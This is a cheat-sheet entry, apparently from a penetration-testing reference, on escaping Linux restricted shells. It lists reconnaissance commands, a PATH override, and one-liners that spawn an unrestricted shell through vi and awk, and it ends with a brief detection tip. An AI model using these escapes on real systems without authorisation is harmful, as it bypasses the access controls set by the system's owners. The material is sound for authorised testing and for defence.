---
technique: Restricted Shell Escape
category: defense-evasion
targets: Linux Shells
protocols: Local, SSH
remote_capable: false
tags: linux defense-evasion restricted-shell rbash escape
---

# Restricted Shell Escape

Restricted shell escape identifies weak command allowlists, writable PATH entries, and interactive programs that can spawn unrestricted shells.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Restricted shell | Current session must limit commands, paths, or shell features |
| Escapable program | An allowed editor, pager, interpreter, or file transfer tool must be present |

## Linux

### Current shell

#sh #shell #recon

Print the current shell path.

```sh title:"Print current shell"
echo "$SHELL"
```
<!-- cheat -->

### Current PATH

#sh #path #recon

Print executable search paths available in the restricted shell.

```sh title:"Print restricted PATH"
echo "$PATH"
```
<!-- cheat -->

### Environment

#sh #env #recon

Print environment variables available in the restricted shell.

```sh title:"Print restricted environment"
env
```
<!-- cheat -->

### Change PATH

#sh #path

Set a broader PATH for the current shell when assignment is permitted.

```sh title:"Set unrestricted PATH"
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
<!-- cheat -->

### Spawn shell through vi

#sh #editor #escape

Start vi with a shell command when vi is allowed.

```sh title:"Spawn shell through vi"
vi -c ':set shell=/bin/sh' -c ':shell'
```
<!-- cheat -->

### Spawn shell through awk

#sh #awk #escape

Spawn a shell through awk when awk is allowed.

```sh title:"Spawn shell through awk"
awk 'BEGIN {system("/bin/sh")}'
```
<!-- cheat -->

## Detection

Monitor restricted accounts launching editors, interpreters, or shells and changing PATH immediately after login.
